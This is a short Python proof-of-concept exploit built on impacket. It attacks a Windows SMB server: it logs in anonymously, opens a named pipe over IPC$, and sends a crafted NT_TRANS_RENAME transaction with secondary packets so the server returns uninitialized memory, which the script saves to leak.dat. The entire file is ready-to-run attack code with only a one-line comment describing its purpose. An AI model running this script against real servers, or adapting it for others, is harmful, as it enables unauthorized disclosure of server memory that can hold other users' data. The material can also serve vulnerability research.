#!/usr/bin/python
from impacket import smb
from mysmb import MYSMB
from struct import pack
import sys

'''
PoC: demonstates leaking information from uninitialize buffer
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 3:
	print("{} <ip> <pipe_name>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = sys.argv[2]

conn = MYSMB(target)

conn.login(USERNAME, PASSWORD)

tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)
fid = conn.nt_create_andx(tid, pipe_name)  # any valid share name should be OK

# create NT_TRANS_RENAME (5) request
mid = conn.next_mid()
conn.send_nt_trans(5, mid=mid, param=pack('<HH', fid, 0), data='A'*0x1000, totalDataCount=0x8000)

# send secondary to set data at displacement 0 to leave uninitialize data in InData
for i in range(7):
	conn.send_nt_trans_secondary(mid, data='B'*0x1000)

data = conn.recv_transaction_data(mid, 0x8000)

# no write parameter
open('leak.dat', 'wb').write(data[4:])
print('All return data is written to leak.dat')

conn.close(tid, fid)
conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
